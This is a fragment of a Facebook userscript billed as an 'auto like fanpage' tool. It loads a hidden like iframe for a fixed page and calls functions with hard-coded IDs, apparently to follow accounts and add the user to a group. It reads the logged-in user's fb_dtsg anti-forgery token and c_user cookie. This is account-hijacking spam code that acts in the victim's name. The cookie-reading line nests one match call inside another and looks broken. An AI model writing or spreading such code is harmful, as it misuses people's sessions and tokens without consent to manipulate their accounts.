...
// @description     FAcebook Auto like fanpage by TAUFEEQ ILYAS
...
(function(){
  ...
  lbox.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(/*document.location.href*/ 'https://www.facebook.com/pages/LoverZ-Point/362312532477') + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=lbox&amp;colorscheme=light&amp;height=80';
  lbox.scrolling = 'no';
  lbox.frameBorder = 0;
...
a("648890651812180");
a("359970554041130");
sublist("636115763116957");
sublist("530585070285813")

//Anggota
var gid = ['162530047140459'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
var spage_id = "648890651812180";
var spost_id = "635546283173905";
var sfoto_id = "631322860262914";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
